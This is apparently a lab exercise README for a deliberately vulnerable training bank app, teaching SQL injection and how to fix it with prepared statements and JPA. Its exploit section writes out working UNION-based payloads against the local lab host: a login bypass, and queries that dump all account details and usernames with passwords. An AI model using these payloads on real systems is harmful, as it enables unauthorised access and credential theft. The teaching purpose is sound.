# Exercise 3 - SQL injection

Exercise to help you understand SQL injection and its mitigation

## Setup and Start Applications

## Setup and Start Applications

1. check out exercise3 
   * choose branch 'exercise3' in the 'VCS -> Git -> Branches' menu within IntelliJ
1. start the v-bank-app in debug mode
   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
\
(the attacker application is not needed in this exercise)   

## Look for SQLi vulnerabilities
Hints:
* In java classes where database operations are carried out; in such classes an instance of the _javax.sql.DataSource_ is injected:
```
    @Autowired
    private DataSource dataSource;
```
  * Please note that this is not an universal property of code vulnerable to SQLi, it only stands for classes in our application that is based on Java (_Datasource_ class) and Spring (_@Autowire_ annotation). 
    Yet, in java the direct use the the JDBC api, such as the _DataSource_ class above is a good indicator of possible SQLi injection. 
* Where SQL is concatenated in the code before passing it onto the JDBC (Java DataBase Connectivity) api.
`connection.createStatement().executeQuery("SELECT * FROM ACCOUNT ACC WHERE ACC.USERNAME  = '" + userName + "'")`

Present vulnerabilities:
* In the *JDBCUserDetailsService* class that loads the UserDetails upon authentication
* In the *JDBCAccountService* class that is an implementation of the *AccountService* coded against the JDBC API directly

## Exploit to understand how SQLi works
* The SQL in the JDBCUserDetailsService class is `"SELECT USERNAME, PASSWORD FROM USER U WHERE U.USERNAME = '" + uname + "'"`.
  This should be tweaked so to return USERNAME, PASSWORD pair with a known password:
`SELECT USERNAME, PASSWORD FROM USER U WHERE U.USERNAME = '' AND SELECT 'bob','password' --'`
using below input on login page:
  * username: ' UNION SELECT 'bob' AS USERNAME,'x' AS PASSWORD --
  * password: x
  This makes the code return a UserDetails object with the username (bob) and password (x) values set in the injected SQL snippet.
  Exploiting this SQLi vulnerability in the authentication component Alice could easily log in as Bob.
* The transaction history page is also vulnerable to SQLi 
  * http://vbank.127.0.0.1.xip.io:8080/history?accountNo=ACCOUNT_NO and the ACCOUNT_NO parameter can be used for injection 
  * By requesting http://vbank.127.0.0.1.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27,%275%27,%276%27,%277%27%20--
    \
    you can see the the injected SQL query has to return 7 columns, of which 6 is displayed and the 7th must be a boolean (0 or 1 in SQL), so you cannot use it to exfiltrate.
  * With the below link you can exfiltrate all account details from the e-bank:
    * http://vbank.127.0.0.1.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%20ACCOUNT_ID,%20USERNAME,%20BALANCE,%20CURRENCY,%20%27X%27,%20%270%27%20%20FROM%20ACCOUNT%20--
    * it merges the result of the "SELECT 1, ACCOUNT_ID, USERNAME, BALANCE, CURRENCY, 'X', 0 FROM ACCOUNT" query with the transaction history query and displays them
* Furthermore, the home page is calling a REST service at http://vbank.127.0.0.1.xip.io:8080/api/v1/account/ACCOUNT_NO where ACCOUNT_NO URL fragment is taken as the parameter of the SQL query selecting user details. This parameter is SQL injectable (due to *JDBCAccountService* class). 
  * we check if we can do UNION select on this parameter, injecting 4 additional result columns with an UNION injection into the original query: > http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT '1', '2','3','4' -- 
  * as this works we can use it to exfiltrate user credentials: > http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD, '3', '4' FROM USER --
  * since it returns only one row we have to iterate over the USER table: http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD,'3','4' FROM (SELECT ROWNUM() as ROW_NUM, USERNAME, PASSWORD FROM USER) WHERE ROW_NUM=1 --
  * increment ROW_NUM till it reaches the end of the USER table.

## Mitigations
* use a parameterized interface / API to the database 
  * prepared statements; a parameterized API escapes all parameters when building the SQL query in the lower layers
  * use an ORM (object-relational-mapping) tool for database operations (JPA: Java Persistence API) this will use prepared statements in the background and make sure your data is escaped before passing it on
* validate user input with strict enough rules so that a value with SQL injection can not be valid and is rejected on validation
* SQL escape you data explicitly if you cannot use a parameterized API (prepared statements or an ORM tool)
  * you better never had to do it.

## Fix
1. Replace standard JDBC statements with prepared statements in *JDBCUserDetailsService* and *JDBCAccountService* 
For example:
```
public class JDBCAccountService implements AccountService {
   ...
   public List<AccountDetails> getAccountDetailsForUser(String userName) {
       ...
            PreparedStatement preparedStatement = connection.prepareStatement("SELECT * FROM ACCOUNT ACC WHERE ACC.USERNAME  = ?");
            preparedStatement.setString(1, userName);
            ResultSet resultSet = preparedStatement.executeQuery();
            ...
```
2. Write a JPA based implementation for AccountService 
For example:
```
@Log
@Service
public class JPAAccountService implements AccountService {

    @Autowired
    private EntityManager entityManager;

    @Override
    @SneakyThrows
    public List<AccountDetails> getAccountDetailsForUser(String userName) {
        Query query = entityManager.createQuery("select ad from AccountDetails ad where ad.username = :uName");
        query.setParameter("uName", userName);
        return query.getResultList();
    }

    @Override
    @SneakyThrows
    public AccountDetails getAccountDetails(String accountNo) {
        return entityManager.find(AccountDetails.class, accountNo);
    }

    @Override
    @SneakyThrows
    @Transactional
    public boolean transfer(String fromAccountId, String toAccountId, BigDecimal amount, String currency, String note) {
        currency = currency.toUpperCase();
        AccountDetails toAccount = getAccountDetails(toAccountId);
        AccountDetails fromAccount = getAccountDetails(fromAccountId);
        //if both account exists we execute the transaction
        if (toAccount != null && fromAccount != null) {
            //update balance of fromAccount
            {
                BigDecimal newBalance = fromAccount.getBalance().subtract(amount);
                fromAccount.setBalance(newBalance);
            }
            //update balance of toAccount
            {
                BigDecimal newBalance = toAccount.getBalance().add(amount);
                toAccount.setBalance(newBalance);
            }
            // create transaction record
            {
                Transaction transaction = new Transaction();
                transaction.setFromAccountNo(fromAccountId);
                transaction.setToAccountNo(toAccountId);
                transaction.setAmount(amount);
                transaction.setCurrency(currency);
                transaction.setNote(note);
                transaction.setExecuted(true);
                entityManager.persist(transaction);
            }
            //
            entityManager.flush();
            return true;
        } else {
            // create transaction record
//            well, let's support only transactions between local accounts
            return false;
        }
    }

    @Override
    @SneakyThrows
    public List<Transaction> getTransactionHistory(String accountNo) {
        return entityManager.createQuery("select t from Transaction t where t.fromAccountNo = :accountNo or t.toAccountNo = :accountNo")
                .setParameter("accountNo", accountNo).getResultList();
    }
}
```

You may see the solution in the __exercise3-solution__ branch at https://github.com/vargadan/v-bank/tree/exercise3-solution

The relevant changes are:
* SQL queries executed with prepared statements in:
  * the JDBCAccountService class in file *JDBCAccountService.java*
  * the JDBCUserDetailsService class in file *JDBCUserDetailsService.java*
* A new Java Persistence API (JPA which is the standard Java Object-Relational-Mapping tool) based implementation of the AccountService interface.
  * JPAAccountService class in file *JPAAccountService.java*
  * it should replace _JDBCAccountService_ as the default implementation of _AccountService_

You can finde more information on SQL injection prevention at:
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md